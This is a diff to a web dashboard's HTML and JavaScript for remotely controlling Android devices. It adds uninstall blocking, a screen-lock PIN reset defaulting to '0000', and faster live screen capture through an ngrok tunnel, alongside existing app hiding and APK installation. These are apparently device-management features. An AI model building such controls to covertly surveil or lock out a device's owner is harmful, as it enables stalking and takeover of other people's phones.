@@ -268,9 +268,13 @@
                         <button style="flex:1" onclick="sendCommand('hide_app', {packageName: document.getElementById('targetPackage').value, hidden: true})">Hide</button>
                         <button style="flex:1" onclick="sendCommand('hide_app', {packageName: document.getElementById('targetPackage').value, hidden: false})">Unhide</button>
                     </div>
-                    <div class="btn-toggle">
+                    <div class="btn-toggle" style="margin-bottom: 8px;">
                         <button style="flex:1" onclick="sendCommand('package_suspend', {packageName: document.getElementById('targetPackage').value, suspended: true})">Suspend</button>
                         <button style="flex:1" onclick="sendCommand('package_suspend', {packageName: document.getElementById('targetPackage').value, suspended: false})">Resume</button>
+                    </div>
+                    <div class="btn-toggle">
+                        <button style="flex:1" class="active-off" onclick="sendCommand('uninstall_block', {packageName: document.getElementById('targetPackage').value, blocked: true})">Block Uninst</button>
+                        <button style="flex:1" onclick="sendCommand('uninstall_block', {packageName: document.getElementById('targetPackage').value, blocked: false})">Allow Uninst</button>
                     </div>
                     <hr>
                     <label>Install APK URL</label>
@@ -370,6 +374,12 @@
                             <option value="AUTOMATIC">Auto</option>
                             <option value="POSTPONE">Postpone</option>
                         </select>
+                    </div>
+                    <hr>
+                    <label>Reset Screen Lock (PIN)</label>
+                    <div class="flex-row" style="margin-top:5px;">
+                        <input type="text" id="newPin" placeholder="Enter 4-6 digit PIN" value="0000">
+                        <button class="action" onclick="sendCommand('reset_password', {password: document.getElementById('newPin').value})">Set PIN</button>
                     </div>
                 </div>
 
@@ -510,7 +520,6 @@
             const deviceId = document.getElementById('deviceSelect').value;
             if (!deviceId) return;
 
-            // Optimistic UI check: Don't overwrite UI if we just sent a command
             const isCoolingDown = (Date.now() - lastCommandTimestamp < SYNC_COOLDOWN);
 
             document.getElementById('controls').style.display = 'block';
@@ -525,7 +534,6 @@
                 if (data.status && data.status.deviceId) {
                     document.getElementById('connectionStatus').className = 'status-dot status-online';
 
-                    // Update logs only if changed significantly to avoid "bar bar refresh" feel
                     const newLog = JSON.stringify(data, null, 2);
                     if (document.getElementById('logs').innerText !== newLog) {
                         document.getElementById('logs').innerText = newLog;
@@ -559,7 +567,6 @@
             const deviceId = document.getElementById('deviceSelect').value;
             if (!deviceId) return alert("Select a device!");
 
-            // Optimistic UI updates
             lastCommandTimestamp = Date.now();
             try {
                 if (action === 'camera') updateButton('btn_camera_allow', 'btn_camera_block', params.disabled);
@@ -588,7 +595,7 @@
                 }
             } catch (e) {
                 showError("Cmd Error: " + e.message);
-                lastCommandTimestamp = 0; // Reset so next fetch fixes UI
+                lastCommandTimestamp = 0;
                 fetchDeviceData();
             }
         }
@@ -628,21 +635,32 @@
             off.className = isEnabled ? '' : 'active-off';
         }
 
-        function updateLiveStream() {
+        let isFetchingFrame = false;
+        let currentBlobUrl = null;
+        async function updateLiveStream() {
+            if (isFetchingFrame) return;
             const deviceId = document.getElementById('deviceSelect').value;
             if (deviceId && document.getElementById('controls').style.display !== 'none') {
-                const img = document.getElementById('liveScreen');
-                // Use a temporary image to check if it exists before switching to avoid flickering
-                const tmp = new Image();
-                tmp.src = '/live-frame?deviceId=' + deviceId + '&t=' + Date.now();
-                tmp.onload = () => img.src = tmp.src;
+                isFetchingFrame = true;
+                try {
+                    const res = await fetch('/live-frame?deviceId=' + deviceId + '&t=' + Date.now(), { headers: NGROK_HEADERS });
+                    if (res.ok) {
+                        const blob = await res.blob();
+                        if (currentBlobUrl) URL.revokeObjectURL(currentBlobUrl);
+                        currentBlobUrl = URL.createObjectURL(blob);
+                        document.getElementById('liveScreen').src = currentBlobUrl;
+                    }
+                } catch (e) {
+                    console.error("Frame fetch error:", e);
+                } finally {
+                    isFetchingFrame = false;
+                }
             }
         }
 
-        // Intervals with staggered timing to avoid congestion
         setInterval(loadDevices, 10000);
         setInterval(fetchDeviceData, 4000);
-        setInterval(updateLiveStream, 2000);
+        setInterval(updateLiveStream, 800);
 
         loadDevices();
     </script>
